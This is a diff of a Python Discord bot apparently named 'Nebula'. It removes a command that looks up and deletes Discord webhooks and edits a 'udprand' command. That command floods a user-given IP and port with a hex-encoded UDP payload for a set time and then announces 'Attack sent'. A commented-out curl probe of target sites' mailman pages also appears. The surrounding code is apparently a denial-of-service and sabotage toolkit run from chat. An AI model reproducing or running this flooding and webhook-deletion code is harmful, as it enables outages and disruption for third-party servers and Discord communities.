@@ -368,43 +368,7 @@ async def chnick(ctx, member: discord.Member, nick):
   #        print(f"{Fore.YELLOW}IP/Domain links found:{Fore.WHITE}")
    #       print("")
 
-#          os.system("curl "+sites+"/mailman/listinfo/mailman -s | findstr POST")
-
-@client.command()
-async def webhook(ctx, webhook):
-    await ctx.message.delete()
-    try:
-        statuscode1 = requests.get(f"{webhook}").status_code
-        if statuscode1 ==404:
-            embed=discord.Embed(title="**Invalid Webhook!**",color=0xbf00ff, timestamp=ctx.message.created_at)
-            embed.set_footer(text=f'{footer} ')
-            await ctx.send(embed=embed,delete_after=10)
-
-        elif statuscode1 ==200:
-            info = requests.get(f"{webhook}")
-            WebName = info.json()['name']
-            WebChannelID = info.json()['channel_id']
-            WebGuildID = info.json()['guild_id']
-            WebID = info.json()['id']
-            Avatar = info.json()['avatar']
-            requests.delete(f"{webhook}")
-            statuscode = requests.get(f"{webhook}").status_code
-            if statuscode ==200:
-                embed=discord.Embed(title="**Error!**",color=0xbf00ff, timestamp=ctx.message.created_at)
-                embed.set_footer(text=f'{footer} ')
-                await ctx.send(embed=embed,delete_after=10)
-
-            else:
-                embed=discord.Embed(title="__**Deleted!**__",color=0xbf00ff, timestamp=ctx.message.created_at)
-                embed.add_field(name="**Name**", value=f"{WebName}", inline=True)
-                embed.add_field(name="**Channel ID**", value=f"{WebChannelID}", inline=True)
-                embed.add_field(name="**Server ID**", value=f"{WebGuildID}", inline=False)
-                embed.set_image(url=f"https://cdn.discordapp.com/avatars/{WebID}/{Avatar}")                          
-                embed.set_footer(text=f'{footer} ')
-                await ctx.send(embed=embed,delete_after=10)
-
-    except:
-        print(f"{Style.BRIGHT}{Fore.WHITE}[{Style.BRIGHT}{Fore.MAGENTA}!]{Fore.WHITE} Invalid Webhook")     
+#          os.system("curl "+sites+"/mailman/listinfo/mailman -s | findstr POST") 
      
 @client.command()
 async def reload(ctx):
@@ -1222,7 +1186,7 @@ async def udprand(ctx, ip, port: int, dur: int):
     payload = "\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02\x9d\x74\x8b\x45\xaa\x7b\xef\xb9\x9e\xfe\xad\x08\x19\xba\xcf\x41\xe0\x16\xa2\x32\x6c\xf3\xcf\xf4\x8e\x3c\x44".encode()
 
     stop = time.time() + dur
-    embed=discord.Embed(title=f"‏‏‎Nebula", description=f"\n\n **Attack sent to {ip}** \n Port = {port} \n Time= {dur} \n Method = udphex",color=0xbf00ff, timestamp=ctx.message.created_at)
+    embed=discord.Embed(title=f"Nebula", description=f"\n\n **Attack sent to {ip}** \n Port = {port} \n Time= {dur} \n Method = udphex",color=0xbf00ff, timestamp=ctx.message.created_at)
     embed.set_footer(text=f'{footer} ')
     await ctx.send(embed=embed,delete_after=10)
 
